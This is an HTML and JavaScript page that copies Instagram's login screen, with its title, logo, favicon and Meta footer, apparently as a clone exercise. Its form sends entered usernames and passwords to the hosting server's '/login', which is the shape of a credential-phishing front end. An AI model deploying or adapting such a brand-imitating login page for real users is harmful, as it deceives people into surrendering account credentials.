<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form action="/login" method="post">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input name="email" class="mail" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="passw" type="password"
                    class="pass" placeholder="Password"/>
                    <button class="sh">show</button>
                    <div class="error">Input field cannot be empty</div>

                    <button type="button" class="btn" >Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in With Facebook</a>
                    </div>
                    <a href="#">Forget password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
  <a href="#">Meta</a>
  <a href="#">About</a>
  <a href="#">Blog</a>
  <a href="#">Jobs</a>
  <a href="#">Help</a>
  <a href="#">API</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
  <a href="#">Locations</a>
  <a href="#">Instagram Lite</a>
  <a href="#">Threads</a>
  <a href="#">Contact Uploading & Non-Users</a>
  <a href="#">Meta Verified</a>
</footer>
<div class="translate">
  <select>
    <option>English</option>
    <option>Spanish</option>
    <option>German</option>
  </select>
  <p>&copy; 2024 Instagram from Meta</p>
</div>

<script type="text/javascript">
  let mail = document.querySelector('.mail');
  let pass = document.querySelector('.pass');
  let btn = document.querySelector('.btn');
  let err = document.querySelector('.error');
  let sh = document.querySelector('.sh');
  let show = false;
  
  pass.addEventListener('input', ()=>{
    pass.value ? sh.style.display = "grid": sh.style.display = "none";
  })
  sh.addEventListener('click', (e)=>{
    e.preventDefault()
    if (!show) {
      pass.type = "text";
      sh.innerHTML = "hide"
      show = !show;
      }else{
        pass.type = "password";
        sh.innerHTML = "show"
        show = !show;
      }
     
  })
  
  btn.addEventListener('click', (e)=>{
    let m = mail.value
    let p = pass.value
    if (!m || !p) {
      err.style.display = "grid"
      setTimeout(()=> {err.style.display = "none"}, 2000)
    }else {btn.type = "submit"}
  })
  
</script>
</body>
</html>
